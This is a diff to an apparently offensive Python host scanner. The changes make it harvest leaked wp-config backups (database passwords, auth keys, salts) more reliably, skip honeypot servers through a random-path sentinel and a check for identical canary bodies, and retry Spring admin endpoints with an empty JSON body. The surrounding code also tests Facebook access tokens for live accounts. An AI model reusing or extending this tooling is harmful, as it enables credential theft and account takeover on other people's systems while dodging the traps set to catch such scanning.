@@ -4,6 +4,7 @@ import asyncio
 import base64
 import json
 import re
+import secrets
 import ssl
 import time
 from typing import Any
@@ -1339,6 +1340,28 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                         ) as resp:
                             ep_data["status_code"] = resp.status
                             body = await resp.text()
+                            # Spring-панели (RuoYi и др.): POST/PUT без заголовка
+                            # Content-Type читаются как octet-stream и отбиваются
+                            # 500 до auth-фильтра. Повтор с пустым JSON даёт
+                            # настоящий ответ (обычно auth-ошибку).
+                            if (
+                                method.upper() in ("POST", "PUT", "PATCH")
+                                and "octet-stream" in body
+                                and "not supported" in body
+                            ):
+                                try:
+                                    async with session.request(
+                                        method.upper(),
+                                        url,
+                                        json={},
+                                        allow_redirects=False,
+                                        timeout=aiohttp.ClientTimeout(total=cfg.check_timeout),
+                                        proxy=proxy,
+                                    ) as retry_resp:
+                                        ep_data["status_code"] = retry_resp.status
+                                        body = await retry_resp.text()
+                                except (aiohttp.ClientError, asyncio.TimeoutError):
+                                    pass
 
                             if resp.status == 200:
                                 # Классифицируем ответ
@@ -2106,7 +2129,28 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 # Догхантинг бэкапов wp-config.php: сам конфиг исполняется,
                 # а .bak/.old/... отдают исходник с DB_PASSWORD/AUTH_KEY/солями.
                 # Только на живом WP-хосте (wp_probe.login), GET-only.
+                # Сентинел: honeypot-серверы отдают канареечный wp-config (и
+                # фейковый wp-login) на ЛЮБОЙ путь. Если несуществующий путь
+                # тоже "находка" - весь хост фейковый, не пишем ничего.
+                wp_honeypot = False
+                try:
+                    async with session.get(
+                        base_url.rstrip("/")
+                        + f"/wp-config.php.{secrets.token_hex(4)}.bak",
+                        headers={"User-Agent": "Mozilla/5.0 (compatible; scanner)"},
+                        allow_redirects=False, proxy=proxy,
+                        timeout=aiohttp.ClientTimeout(total=8.0),
+                    ) as sent_resp:
+                        if sent_resp.status == 200:
+                            sent_body = await sent_resp.text()
+                            sent_patterns, _ = classify_response(sent_body[:100_000])
+                            wp_honeypot = "wp_config" in sent_patterns
+                except (aiohttp.ClientError, asyncio.TimeoutError):
+                    pass
+                wp_candidates: list[tuple[str, str, list, str]] = []
                 for wp_path in WP_CONFIG_PROBE_PATHS:
+                    if wp_honeypot:
+                        break
                     try:
                         async with session.get(
                             base_url.rstrip("/") + wp_path,
@@ -2120,20 +2164,33 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                             wpatterns, wsev = classify_response(wbody[:100_000])
                             if "wp_config" not in wpatterns:
                                 continue
-                            wp_ep: dict[str, Any] = {
-                                "path": wp_path + "#probe", "method": "GET",
-                                "expects_auth": False, "status_code": wresp.status,
-                                "verdict": "VULNERABLE", "patterns": wpatterns,
-                                "response": wbody[:100_000],
-                            }
-                            endpoints_data.append(wp_ep)
-                            result.total_endpoints += 1
-                            result.vulnerable_count += 1
-                            all_patterns.extend(wpatterns)
-                            if severity_order.get(wsev, 0) > severity_order.get(max_severity, 0):
-                                max_severity = wsev
+                            wp_candidates.append((wp_path, wbody, wpatterns, wsev))
                     except (aiohttp.ClientError, asyncio.TimeoutError):
                         continue
+
+                # Canned-раздача: honeypot отдаёт один и тот же конфиг на все
+                # известные имена бэкапов (.bak/.old/...), при этом соседние
+                # хосты получают чуть другой вариант - по дедупу тел не ловится.
+                # ≥3 разных пути с байт-в-байт одинаковым телом = шаблон, а не
+                # утечка (реальные бэкапы различаются). Решение после цикла:
+                # записываем только если это не так.
+                if len(wp_candidates) >= 3 and len(
+                    {b for _, b, _, _ in wp_candidates}
+                ) == 1:
+                    wp_candidates = []
+                for wp_path, wbody, wpatterns, wsev in wp_candidates:
+                    wp_ep: dict[str, Any] = {
+                        "path": wp_path + "#probe", "method": "GET",
+                        "expects_auth": False, "status_code": 200,
+                        "verdict": "VULNERABLE", "patterns": wpatterns,
+                        "response": wbody[:100_000],
+                    }
+                    endpoints_data.append(wp_ep)
+                    result.total_endpoints += 1
+                    result.vulnerable_count += 1
+                    all_patterns.extend(wpatterns)
+                    if severity_order.get(wsev, 0) > severity_order.get(max_severity, 0):
+                        max_severity = wsev
 
             # Facebook EAA-токены: GET graph /me (read-only) = живые аккаунты
             facebook_checks: list[dict[str, Any]] = []
